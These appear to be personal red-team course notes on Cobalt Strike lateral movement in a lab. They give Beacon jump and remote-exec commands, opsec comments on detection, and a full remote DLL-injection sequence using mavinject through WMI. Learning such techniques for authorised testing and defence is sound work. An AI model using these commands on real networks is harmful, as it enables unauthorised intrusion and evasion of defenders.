@@ -1,0 +1,60 @@
+jump <--opsec wise my beacon gets kiled in real world
+- Uploading a payload to the target.
+- Remotely executing that payload.
+- Connecting to the new Beacon session (in the case of P2P).
+- Deleting the payload from the target.
+
+jump [exploit] [target] [listener]
+   Exploit                   Arch  Description
+    -------                   ----  -----------
+    psexec                    x86   Use a service to run a Service EXE artifact
+    psexec64                  x64   Use a service to run a Service EXE artifact
+    psexec_psh                x86   Use a service to run a PowerShell one-liner
+    winrm                     x86   Run a PowerShell script via WinRM
+    winrm64                   x64   Run a PowerShell script via WinR
+
+remote-exec
+remote-exec [method] [target] [command].
+beacon> remote-exec
+​
+Beacon Remote Execute Methods
+=============================
+​
+    Methods                         Description
+    -------                         -----------
+    psexec                          Remote execute via Service Control Manager
+    winrm                           Remote execute via WinRM (PowerShell)
+    wmi                             Remote execute via WMI
+
+These can be useful for cases where the technique cannot be reliably integrated into the jump command.
+
+Windows Remote Management (WinRM) <-- executes payload entirely in memory, does not need to be dropped to disk. 
+- will run in current context of user or impersonated user.
+- winrm is the only remote-exec that provides output, good for enumeration.
+- jump winrm64 lon-ws-1 smb
+
+PsExec <- beacons executed as psexec always run as SYSTEM, loud and bad on the opsec
+- built in and performs injection by default. 
+- jump psexec64 lon-ws-1 smb
+
+SCShell <-- better opsec
+C:\Tools\SCShell\CS-BOF\scshell.cna
+Cobalt Strike > Script Manager
+
+Adds a ne exploit
+
+LOLBAS (living off the land Binaries and scripts) 
+
+MavInject:
+MavInject is a signed Microsoft executable that provides functionality for App-V to inject libraries into other process.  It lives in the System32/SysWOW64 directories on default Windows installations
+- mavinject.exe [PID] /INJECTRUNNING [DLL PATH]
+- remote-exec to list the running process on remote target
+-- remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
+beacon> cd \\lon-ws-1\ADMIN$\System32
+beacon> upload C:\Payloads\smb_x64.dll
+beacon> remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll
+beacon> link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
+
+
+
+
